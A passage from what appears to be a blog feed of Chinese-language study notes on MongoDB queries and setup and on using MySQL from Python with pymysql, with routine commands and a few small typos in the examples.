完全相同,只是只返回第一条查找到的文档<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">db.class0.findOne(&#123;age:17&#125;,&#123;_id:0&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="query的更多用法"><a href="#query的更多用法" class="headerlink" title="query的更多用法"></a><strong>query的更多用法</strong></h4><ul><li>操作符: 使用$符号注明一个特殊字符串,表示一定的含义<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$lt#表示小于</span><br></pre></td></tr></table></figure></li></ul><h5 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a><strong>比较操作符</strong></h5><pre><code>$eq        #等于    ==db.class0.find({age:{$eq:17}},{_id:0})#筛选年龄等于17的db.class0.find({age:17},{_id:0})    #直接查一样,等于一般用得少$lt        #小于    &lt;db.class0.find({age:{$lt:17}},{_id:0})#mongo中字符串也可以比较大小$lte    #小于等于    &lt;=db.class0.find({age:{$lte:17}},{_id:0})$gt        #大于    &gt;db.class0.find({age:{$gt:17}},{_id:0})$gte    #大于等于    &gt;=db.class0.find({age:{$gte:17}},{_id:0})$ne        #不等于        !=db.class0.find({age:{$ne:17}},{_id:0})#如果一个文档没有这个age域也显示为不等于$in        #包含db.class0.find({age:{$in:[16,17,18]}},{_id:0})#nin    #不包含db.class0.find({age:{$nin:[16,17,18]}},{_id:0})</code></pre><h5 id="逻辑操作符"><a href="#逻辑操作符" class="headerlink" title="逻辑操作符"></a><strong>逻辑操作符</strong></h5><pre><code>$and    #逻辑与#年龄小于19且性别是男db.class0.find({age:{$lt:19},sex:&apos;m&apos;},{_id:0})#年龄小于19且大于15db.class0.find({age:{$lt:19,$gt:15}},{_id:0})$and逻辑语法db.class0.find({$and:[{age:17},{name:&apos;Lei&apos;}]})$or        #逻辑或db.class0.find({$or:[{age:{$lt:22}},{name:&apos;wukong&apos;}]},{_id:0})db.class0.find({$or:[{age:{lt:18}},{age:{$gt:30}}]},{_id:0})$not    #逻辑非db.class0.find({age:{$not:{$eq:17}}},{_id:0})$nor    #既不也不db.class0.find({$nor:[{age:{$gt:18}},{sex:&apos;m&apos;}]},{_id:0})</code></pre><p><strong>条件混合</strong></p><ul><li>(年龄小于20 <strong>或者</strong> 姓名为Lei) <strong>并且</strong> 性别为女的人<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.</span><br><span class="line">db.class0.find(&#123;$and:[&#123;$or:[&#123;age:&#123;$lt:20&#125;&#125;,&#123;name:&#39;Lily&#39;&#125;]&#125;,&#123;sex:&#39;w&#39;&#125;]&#125;,&#123;_id:0&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="数组查找"><a href="#数组查找" class="headerlink" title="数组查找"></a><strong>数组查找</strong></h4><pre><code>#查看数组中包含某一项的db.class1.find({hobby:&apos;python&apos;},{_id:0})$all#查找一个数组中同时包含多项的文档db.class1.find({hobby:{$all:[&apos;python&apos;,&apos;mongodb&apos;]}},{_id:0})$size#查找数组元素个数为指定个数的文档db.class1.find({hobby:{$size:3}},{_id:0})#数组切片显示,对数组进行切片显示$slicedb.class1.find({hobby:{$size:3}},{_id:0,hobby:{$slice:2}})             #显示前两项db.class1.find({hobby:{$size:3}},{_id:0,hobby:{$slice:[1,2]}})        #显示后两项</code></pre><h4 id="其它查找方法"><a href="#其它查找方法" class="headerlink" title="其它查找方法"></a><strong>其它查找方法</strong></h4><pre><code>#判断一个域是否存在$existse.g.    查找存在hobby域的文档db.class1.find({hobby:{$exists:true}},{_id:0})e.g.    查找不存在sex域的文档db.class1.find({sex:{$exists:false}},{_id:0})$mod#做除数余数查找e.g        查找age域 被2除余1的文档,就是单数db.class1.find({age:{$mod:[2,1]}},{_id:0})e.g        查找age域 被3除余0的文档,整除db.class1.find({age:{$mod:[3,0]}},{_id:0})$type#查找指定数据类型的文档#monggodb为每种数据类型作了编号,对照如下官方文档https://docs.mongodb.com/manual/reference/operator/query/type/index.htmle.g.    查找age域为整数类型db.class1.find({age:{$type:1}},{_id:0})e.g.    查找name域为字符串类型db.class1.find({name:{$type:2}},{_id:0})e.g.    查找hobby域为数组类型db.class1.find({hobby:{$type:4}},{_id:0])</code></pre><h4 id="进一步的信息筛选"><a href="#进一步的信息筛选" class="headerlink" title="进一步的信息筛选"></a><strong>进一步的信息筛选</strong></h4><p><strong>distinct()函数</strong> 去重</p><ul><li>功能: 查看一个集合中某个域值的覆盖范围  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g. 查看集合中hobby域的值都有哪些</span><br><span class="line">db.class1.distinct(&#39;hobby&#39;)</span><br></pre></td></tr></table></figure></li></ul><p><strong>pretty(n)</strong> 格式化显示</p><ul><li>功能: 将查询结果格式化显示  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class1.find().pretty()</span><br></pre></td></tr></table></figure></li></ul><p><strong>limit(n)</strong> 限制</p><ul><li>功能: 查询结果显示前 n条  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.查询结果显示前3个</span><br><span class="line">db.class1.find(&#123;&#125;&#123;_id:0&#125;).limit(3)</span><br></pre></td></tr></table></figure></li></ul><p><strong>skip(n)</strong></p><ul><li>功能: 查询结果跳过前 n条  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.显示时跳过前3条</span><br><span class="line">db.class1.find(&#123;&#125;,&#123;_id:0&#125;).skip(3)</span><br></pre></td></tr></table></figure></li></ul><p><strong>count()</strong> 计数</p><ul><li>功能: 对查找结果计数统计  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e.g.统计sex字段为m的文档数量</span><br><span class="line">db.class0.find(&#123;sex:&#39;m&#39;&#125;,&#123;_id:0&#125;).count()</span><br></pre></td></tr></table></figure></li></ul><p><strong>sort({键:1/-1})</strong></p><ul><li>功能: 对查找结果排序</li><li>1表示按照升序排列, -1表示按照降序排列  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e.g.对查询结果按照年龄升序排列</span><br><span class="line">db.class1.find(&#123;age:&#123;$exists:true&#125;&#125;,&#123;_id:0&#125;).sort(&#123;age:1&#125;)</span><br><span class="line"></span><br><span class="line">e.g复合排序: 当第一排序项相同的时候,按照第二排序项排序</span><br><span class="line">db.class1.find(&#123;age:&#123;$exists:true&#125;&#125;,&#123;_id:0&#125;).sort(&#123;age:1,name:-1&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="函数的连续使用"><a href="#函数的连续使用" class="headerlink" title="函数的连续使用"></a><strong>函数的连续使用</strong></h4><ul><li>获取集合中年龄最小的前3个文档<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.class1.find(&#123;&#125;,&#123;_id:0&#125;).sort(&#123;age:1&#125;).limit(3)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;MySQL和MongoDB查找操作对比&quot;&gt;&lt;a href=&quot;#MySQL和MongoDB查找操作对比&quot; class=&quot;headerlink&quot; title=&quot;MySQL和MongoDB查找操作对比&quot;&gt;&lt;/a&gt;&lt;strong&gt;MySQL和MongoDB查找操作对比&lt;/
      
    
    </summary>
    
    
      <category term="DBMS" scheme="http://c.cat.plus/categories/DBMS/"/>
    
      <category term="MongoDB" scheme="http://c.cat.plus/categories/DBMS/MongoDB/"/>
    
    
      <category term="mongodb" scheme="http://c.cat.plus/tags/mongodb/"/>
    
  </entry>
  
  <entry>
    <title>非关系型数据库MongoDB简介</title>
    <link href="http://c.cat.plus/2018/03/12/MongoDB/%E9%9D%9E%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93MongoDB%E7%AE%80%E4%BB%8B/"/>
    <id>http://c.cat.plus/2018/03/12/MongoDB/%E9%9D%9E%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93MongoDB%E7%AE%80%E4%BB%8B/</id>
    <published>2018-03-12T09:56:18.000Z</published>
    <updated>2020-07-19T11:02:59.095Z</updated>
    
    <content type="html"><![CDATA[<h4 id="非关系型数据库-NoSQL-–-gt-Not-only-SQL"><a href="#非关系型数据库-NoSQL-–-gt-Not-only-SQL" class="headerlink" title="非关系型数据库 (NoSQL –&gt; Not only SQL)"></a><strong>非关系型数据库</strong> (NoSQL –&gt; Not only SQL)</h4><ul><li><p><strong>优点</strong>:</p><ul><li>高并发,大数据读写能力强</li><li>支持分布式,容易扩展</li><li>弱化了数据结构,降低了数据的一致性</li></ul></li><li><p><strong>缺点</strong></p><ul><li>通用性差,没有像SQL那样一致的操作</li><li>操作灵活,容易混乱</li><li>没有join,有些NoSQL没有事务支持等操作</li></ul></li></ul><h4 id="什么场景需要使用到NoSQL"><a href="#什么场景需要使用到NoSQL" class="headerlink" title="什么场景需要使用到NoSQL?"></a><strong>什么场景需要使用到NoSQL?</strong></h4><ul><li>数据一致性要求低</li><li>数据库并发处理要求高</li><li>数据库设计时对大小的估算不确定,需要分布拓展</li><li>给定的数据比较容易建立起NoSQL的模型</li></ul><h4 id="NoSQL分类"><a href="#NoSQL分类" class="headerlink" title="NoSQL分类"></a><strong>NoSQL分类</strong></h4><ol><li><p>键值型数据库</p><ul><li>Redis, Oracle, BDB, tokyo</li></ul></li><li><p>列存储数据库</p><ul><li>HBase</li></ul></li><li><p>文档型数据库</p><ul><li>MongoDB, CouchDB</li></ul></li><li><p>图形数据库</p></li></ol><blockquote><h4 id="MongoDB简介-非关系型-文档型数据库"><a href="#MongoDB简介-非关系型-文档型数据库" class="headerlink" title="MongoDB简介 (非关系型,文档型数据库)"></a><strong>MongoDB简介</strong> (非关系型,文档型数据库)</h4></blockquote><ol><li>MongoDB 是由C++语言编写的,是一个基于分布式文件存储的开源数据库管理系统.</li><li>支持非常丰富的增删改查数据操作,被评为最像关系型数据库的非关系型数据库</li><li>支持非常丰富的数据类型</li><li>使用方便,便于部署,支持分布式,容易拓展</li><li>支持众多的编程语言接口(python,ruby,c++,php…)</li></ol><p><strong>组成结构</strong><br>键值对 —&gt; 文档 —&gt; 集合 —&gt; 数据库</p><h4 id="MongoDB-安装"><a href="#MongoDB-安装" class="headerlink" title="MongoDB 安装"></a><strong>MongoDB 安装</strong></h4><p><strong>linux自动安装</strong></p><pre><code>apt-get install mongodb#默认安装位置    /var/lib/mongodb/#配置文件        /etc/mongodb.conf#命令集            /usr/bin</code></pre><p><strong>手动安装</strong></p><pre><code>#下载解压wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-debian92-4.2.8.tgztar -zxvf mongodb-linux-x86_64-debian92-4.2.8.tgzmv mongodb-linux-x86_64-debian92-4.2.8.tgz /usr/local/mongodb4#将文件夹下的命令集目录(bin目录)添加到环境变量PATH=$PATH:/usr/local/mongodb4/binexport PATH将以上两句写在 /etc/rc.local重启系统</code></pre><ul><li><code>mongodb</code> 命令  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mongod --dbpath 目录路径</span><br><span class="line">#设置数据库存储位置</span><br><span class="line"></span><br><span class="line">mongod --port 8888</span><br><span class="line">#设置端口号(默认27017)</span><br></pre></td></tr></table></figure></li><li><code>mongo</code> 命令  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mongo</span><br><span class="line">#进入mongodb的交互shell界面用来操作数据库</span><br></pre></td></tr></table></figure><h4 id="mysql-和-mongodb-概念对比"><a href="#mysql-和-mongodb-概念对比" class="headerlink" title="mysql 和 mongodb 概念对比"></a><strong>mysql 和 mongodb 概念对比</strong></h4></li></ul><table><thead><tr><th align="center">mysql</th><th align="center">mongo</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">database</td><td align="center">database</td><td align="center">数据库</td></tr><tr><td align="center">table</td><td align="center">collection</td><td align="center">表/集合</td></tr><tr><td align="center">column</td><td align="center">field</td><td align="center">字段/域</td></tr><tr><td align="center">row</td><td align="center">document</td><td align="center">记录/文档</td></tr><tr><td align="center">index</td><td align="center">index</td><td align="center">索引</td></tr></tbody></table><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a><strong>创建数据库</strong></h4><pre><code>use databasename#创建一个名为stu的数据库use stu</code></pre><ul><li>use实际功能是表示选择使用哪个数据库,当这个数据库不存在时即表示创建该数据库</li><li>使用use后数据库并不会马上被创建,而是需要插入数据后数据库才会被创建</li></ul><p><strong>数据库名称规则</strong></p><ul><li>原则上是任意满足以下几条的utf-8字符<ol><li>不能是空字符,不能含有空格’ ‘,点 ‘.’ ‘/‘ ‘&#39; ‘\0’</li><li>习惯上使用英文小写</li><li>长度不超过64字节</li><li>不能使用 admin local config 这样的名字</li></ol></li></ul><h5 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a><strong>查看数据库</strong></h5><pre><code>show dbs#mongo系统库admin: 存储用户local: 存储本地数据config: 存储分片配置信息</code></pre><ul><li><strong>db</strong> : mongo系统全局变量,代表你当前正在使用的数据库<ul><li>db 默认为test 如果插入数据即创建test数据库</li></ul></li></ul><h4 id="数据库的备份和恢复"><a href="#数据库的备份和恢复" class="headerlink" title="数据库的备份和恢复"></a><strong>数据库的备份和恢复</strong></h4><ul><li>备份  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mongodump -h dbhost -d dbname -o dbdir</span><br><span class="line">mongodump -h 127.0.0.1 -d stu -o stu</span><br><span class="line">#将本机下 stu 数据库备份到 当前目录的stu文件夹中,会在stu文件夹中自动生成一个stu文件夹则为备份文件</span><br></pre></td></tr></table></figure></li><li>恢复  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mongorestore -h &lt;dbhost&gt;:&lt;port&gt; -d dbname &lt;path&gt;</span><br><span class="line">mongorestore -h 127.0.0.1:27017 -d test stu&#x2F;stu</span><br><span class="line">#将stu文件夹下的备份文件stu恢复到本机的test数据库</span><br></pre></td></tr></table></figure></li></ul><h4 id="数据库的监测命令"><a href="#数据库的监测命令" class="headerlink" title="数据库的监测命令"></a><strong>数据库的监测命令</strong></h4><p><strong>mongostat</strong></p><ul><li>insert query update delete        #每秒增查改删的次数</li><li>getmore command                 #每秒运行命令次数</li><li>dirty used flusher                #每秒操作磁盘的次数</li><li>vsize res                        #使用虚拟内存和物理内存</li></ul><p><strong>mongotop</strong></p><ul><li>监测每个数据库的读写时长</li></ul><table><thead><tr><th align="center">ns</th><th align="center">total</th><th align="center">read</th><th align="center">write</th></tr></thead><tbody><tr><td align="center">数据集合</td><td align="center">总时长</td><td align="center">读时长</td><td align="center">写时长</td></tr></tbody></table><h4 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a><strong>删除数据库</strong></h4><pre><code>db.dropDatabase()#删除db所代表的数据库</code></pre><h4 id="集合-表-的创建"><a href="#集合-表-的创建" class="headerlink" title="集合(表)的创建"></a>集合(表)的创建</h4><pre><code>db.createCollection(collection_name)db.createCollection(&quot;class2&quot;)#在当前数据库下创建一个名字为class2的集合</code></pre><p><strong>查看数据库中的集合</strong>    </p><pre><code>show collectionsshow tables</code></pre><ul><li>集合的命名规则:<ol><li>不能为空字符串,不能有’\0’</li><li>不能以system.开头,这是系统集合的保留前缀</li><li>不能和保留字重复</li></ol></li></ul><p><strong>创建集合2</strong></p><pre><code>db.collectionName.insert()#当向一个集合中插入文档时,如果该集合不存在则自动创建db.cat.insert({a:1})#如果cat不存在则会创建cat集合并插入该数据</code></pre><h5 id="删除集合"><a href="#删除集合" class="headerlink" title="删除集合"></a><strong>删除集合</strong></h5><pre><code>db.collectionName.drop()db.cat.drop()#删除cat集合</code></pre><h5 id="集合重命名"><a href="#集合重命名" class="headerlink" title="集合重命名"></a><strong>集合重命名</strong></h5><pre><code>db.collectionName.renameCollection(&apos;new_name&apos;)e.g.db.class2.renameCollection(&apos;class0&apos;)#将class2重命名为class0</code></pre><h4 id="文档-记录"><a href="#文档-记录" class="headerlink" title="文档 (记录)"></a><strong>文档</strong> (记录)</h4><ul><li><p>键值对组成文档 —&gt; 类似Python中的字典</p></li><li><p>bson —&gt; json —&gt; JavaScrip</p></li><li><p>mongodb 中文档的数据组织形式为bson格式,类似Python的字典,也是由键值对构成</p></li><li><p>文档中 <strong>键(域/字段)</strong> 的命名规则:  </p><ol><li>utf-8格式字符串</li><li>不能有\0,习惯上不用 <code>. 和 $</code></li><li>以_开头的多为保留键,自定义时一般不以_开头</li></ol></li><li><p><strong>注意</strong> </p><ul><li>文档键值对是有序的</li><li>mongodb中严格区分大小写</li></ul></li><li><p><strong>值(记录内容)</strong>: mongodb的支持数据类型</p></li><li><p>支持的数据类型</p></li></ul><table><thead><tr><th align="center">类型</th><th align="center">值</th></tr></thead><tbody><tr><td align="center">整型</td><td align="center">整数</td></tr><tr><td align="center">布尔类型</td><td align="center">true false</td></tr><tr><td align="center">浮点型</td><td align="center">小数</td></tr><tr><td align="center">Arrays</td><td align="center">数组类型[1,2,3]</td></tr><tr><td align="center">Timestamp</td><td align="center">时间戳</td></tr><tr><td align="center">Date</td><td align="center">时间日期</td></tr><tr><td align="center">Object</td><td align="center">对象/内部文档</td></tr><tr><td align="center">Null</td><td align="center">空值</td></tr><tr><td align="center">Symbol</td><td align="center">特殊字符</td></tr><tr><td align="center">String</td><td align="center">字符串</td></tr><tr><td align="center">Binary data</td><td align="center">二进制字串</td></tr><tr><td align="center">code</td><td align="center">代码</td></tr><tr><td align="center">regex</td><td align="center">正则表达式</td></tr><tr><td align="center">ObjectId</td><td align="center">ObjectId()字串</td></tr></tbody></table><ul><li>ObjectId : 系统自动为每个文档生成 的不重复的主键<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">键名称: _id</span><br><span class="line">值:ObjectId(&quot;随机24位16进制数&quot;)</span><br><span class="line"></span><br><span class="line">24位16进制数</span><br><span class="line">前8位 文档创建时间</span><br><span class="line">6位 机器ID</span><br><span class="line">4位 进程ID</span><br><span class="line">6位 计数器</span><br></pre></td></tr></table></figure></li></ul><p><strong>集合中文档特点</strong></p><ul><li>集合中的文档域不一定相同 -&gt; 不保证数据一致性</li><li>集合中的文档结构不一定相同</li></ul><p><strong>集合设计原则</strong></p><ul><li>集合中的文档尽可能描述的数据类似</li><li>同一类文档放在相同的集合,不同的文档分集合存放</li><li>层次的包裹不宜太多</li></ul><h4 id="插入文档"><a href="#插入文档" class="headerlink" title="插入文档"></a><strong>插入文档</strong></h4><pre><code>db.collectionName.insert()e.g.db.class0.insert({name:&apos;Lucy&apos;,age:16,sex:&apos;w&apos;})#当作为文档插入时键可以不加引号</code></pre><p><strong>查看插入结果</strong></p><pre><code>db.class0.find()</code></pre><p><strong>插入多条文档</strong></p><pre><code>db.collectionName.insert([{},{},{}])e.g.db.class0.insert([{name:&apos;阿猫&apos;,age:22},{name:&apos;阿狗&apos;,age:23},{name:&apos;宝宝&apos;,age:3}])</code></pre><ul><li><code>_id</code> 为系统自动添加主键,如果自己写 <code>_id</code>域则会使用自己写的值,但是该值仍不允许重复</li></ul><p><strong>save 插入数据</strong></p><pre><code>db.collectionName.save()e.g.db.class0.save({name:&apos;bajie&apos;,age:17,sex:&apos;m&apos;})db.class0.save({_id:2,name:&apos;bajie&apos;,age:17,sex:&apos;m&apos;})db.class0.save({_id:2,name:&apos;wukong&apos;,age:17,sex:&apos;m&apos;})</code></pre><ul><li>在不加_id时使用同 insert</li><li>如果使用save插入的时候加了_id,则如果_id值不存在则正常插入,如果该值存在,则修改原来内容</li><li>save无法一次插入多个文档</li></ul><h4 id="获取集合对象"><a href="#获取集合对象" class="headerlink" title="获取集合对象"></a><strong>获取集合对象</strong></h4><pre><code>db.getCollection(&apos;collection_name&apos;)e.g.db.getCollection(&quot;class0&quot;).insert({name:&apos;wukong&apos;,age:1700})</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;非关系型数据库-NoSQL-–-gt-Not-only-SQL&quot;&gt;&lt;a href=&quot;#非关系型数据库-NoSQL-–-gt-Not-only-SQL&quot; class=&quot;headerlink&quot; title=&quot;非关系型数据库 (NoSQL –&amp;gt; Not only 
      
    
    </summary>
    
    
      <category term="DBMS" scheme="http://c.cat.plus/categories/DBMS/"/>
    
      <category term="MongoDB" scheme="http://c.cat.plus/categories/DBMS/MongoDB/"/>
    
    
      <category term="mongodb" scheme="http://c.cat.plus/tags/mongodb/"/>
    
      <category term="nosql" scheme="http://c.cat.plus/tags/nosql/"/>
    
  </entry>
  
  <entry>
    <title>Python编程使用MySQL</title>
    <link href="http://c.cat.plus/2018/03/10/MySQL/Python%E7%BC%96%E7%A8%8B%E4%BD%BF%E7%94%A8MySQL/"/>
    <id>http://c.cat.plus/2018/03/10/MySQL/Python%E7%BC%96%E7%A8%8B%E4%BD%BF%E7%94%A8MySQL/</id>
    <published>2018-03-10T07:59:38.000Z</published>
    <updated>2020-07-21T11:06:43.358Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Python数据库编程"><a href="#Python数据库编程" class="headerlink" title="Python数据库编程"></a><strong>Python数据库编程</strong></h4><ul><li>python数据库接口(Python DB-API)<ul><li>为开发人员提供的数据库应用编程接口</li><li>支持的数据库服务软件<ul><li>Mysql, Oracle, SQL_Server, Mongodb…</li></ul></li><li>python提供的操作mysql模块  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3: pymysql</span><br><span class="line">python2: MySQLdb</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="pymysql模块使用流程"><a href="#pymysql模块使用流程" class="headerlink" title="pymysql模块使用流程"></a><strong>pymysql模块使用流程</strong></h4><ol><li>建立数据库连接<ul><li>语法格式  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象名 &#x3D; pymysql.connect(&quot;主机地址&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;库名&quot;,charset&#x3D;&quot;utf8&quot;)</span><br></pre></td></tr></table></figure></li><li>connect连接对象支持的方法  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cursor() #创建一个游标对象db.cursor()</span><br><span class="line">commit() #提交到数据库执行(表记录增删改)</span><br><span class="line">rollback() #回滚</span><br><span class="line">close()#关闭数据库连接</span><br></pre></td></tr></table></figure></li><li>cursor游标对象支持的方法  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">execute(&quot;SQL命令&quot;)#执行SQL命令</span><br><span class="line">fetchone()#取得结果集的第一条记录</span><br><span class="line">fetchmany(n)#取得结果集的 n 条纪录</span><br><span class="line">fetchall()#取得结果集的所有记录</span><br><span class="line">close()#关闭游标对象</span><br></pre></td></tr></table></figure></li></ul></li><li>创建游标对象</li><li>使用游标对象的方法操作数据库</li><li>提交commit</li><li>关闭游标对象</li><li>关闭数据库连接</li></ol><p><strong>示例</strong> <code>mysql_test.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="comment">#1.创建数据库连接对象</span></span><br><span class="line">db=pymysql.connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"123456"</span>,<span class="string">"db2"</span>,charset=<span class="string">"utf8"</span>)</span><br><span class="line"><span class="comment">#2.创建游标对象</span></span><br><span class="line">cursor=db.cursor()</span><br><span class="line"><span class="comment">#3.利用游标对象cursor的方法来操作数据库</span></span><br><span class="line">cursor.execute(<span class="string">"insert into userinfo values(1,200000,'sicuansheng');"</span>)</span><br><span class="line"><span class="comment">#4.提交到数据库commit</span></span><br><span class="line">db.commit()</span><br><span class="line"><span class="comment">#5. 关闭游标对象</span></span><br><span class="line">cursor.close()</span><br><span class="line"><span class="comment">#6.关闭数据库连接</span></span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure><p><strong>建立数据库连接</strong></p><ul><li>语法格式  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象名 &#x3D; pymysql.connect(&quot;主机地址&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;库名&quot;,charset&#x3D;&quot;utf8&quot;)</span><br></pre></td></tr></table></figure></li><li>connect连接对象支持的方法  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cursor() #创建一个游标对象db.cursor()</span><br><span class="line">commit() #提交到数据库执行(表记录增删改)</span><br><span class="line">rollback() #回滚</span><br><span class="line">close()#关闭数据库连接</span><br></pre></td></tr></table></figure></li><li>cursor游标对象支持的方法  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">execute(&quot;SQL命令&quot;)#执行SQL命令</span><br><span class="line">fetchone()#取得结果集的第一条记录</span><br><span class="line">fetchmany(n)#取得结果集的 n 条纪录</span><br><span class="line">fetchall()#取得结果集的所有记录</span><br><span class="line">close()#关闭游标对象</span><br></pre></td></tr></table></figure></li></ul><p><strong>SQL查询示例</strong> <code>inquiry.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">db=pymysql.connect(<span class="string">"localhost"</span>,<span class="string">"cat"</span>,<span class="string">"heybeauty"</span>,<span class="string">"db2"</span>,charset=<span class="string">"utf8"</span>)</span><br><span class="line"></span><br><span class="line">cursor=db.cursor()</span><br><span class="line"></span><br><span class="line">sql_select=<span class="string">"select * from userinfo;"</span></span><br><span class="line">cursor.execute(sql_select)</span><br><span class="line"></span><br><span class="line">data=cursor.fetchone()</span><br><span class="line">print(<span class="string">"fetchone的结果为"</span>,data)</span><br><span class="line"></span><br><span class="line">data2=cursor.fetchmany(<span class="number">2</span>)</span><br><span class="line">print(<span class="string">"fetchmany(2)的结果为"</span>,data2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data2:</span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line">data3=cursor.fetchall()</span><br><span class="line">print(<span class="string">"fetchall()的结果为"</span>,data3)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data3:</span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line">db.commit()</span><br><span class="line">cursor.close()</span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure><p><strong>MySQL workbench</strong> </p><ul><li>官方图形化界面管理工具<ul><li><code>https://www.mysql.com/products/workbench/</code></li></ul></li></ul><p><strong>ER模型&amp;ER图</strong></p><ul><li>定义<ul><li>ER模型即 实体 - 关系 模型</li><li>ER图即 实体关系图</li></ul></li><li>三个概念<ul><li>实体</li><li>属性</li><li>关系<ul><li>定义: 实体之间的关系</li><li>分类<ul><li>一对一关系(1:1) # 班级和班长    </li><li>一对多关系(1:n) # 班级和学生</li><li>多对多关系(m:n) # 学生和课程</li></ul></li></ul></li><li>ER图的绘制<ul><li>矩形框代表实体,菱形框代表关系,椭圆形代表属性</li></ul></li></ul></li></ul>]]></content>
